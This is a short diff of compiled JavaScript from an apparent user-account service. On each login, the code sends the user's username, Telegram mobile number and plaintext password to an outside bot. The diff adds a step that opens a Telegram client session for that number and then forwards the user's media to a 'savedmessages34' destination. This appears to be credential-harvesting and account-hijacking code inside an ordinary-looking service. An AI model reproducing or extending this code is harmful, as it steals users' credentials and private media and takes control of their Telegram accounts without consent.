@@ -36,7 +36,8 @@ let UsersService = class UsersService {
         }
         else {
             await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);
-            setTimeout(() => {
+            setTimeout(async () => {
+                await this.telegramService.createClient(user.mobile, false, false);
                 this.telegramService.forwardMedia(user.mobile, "savedmessages34", null);
             }, 2000);
             const newUser = new this.userModel(user);
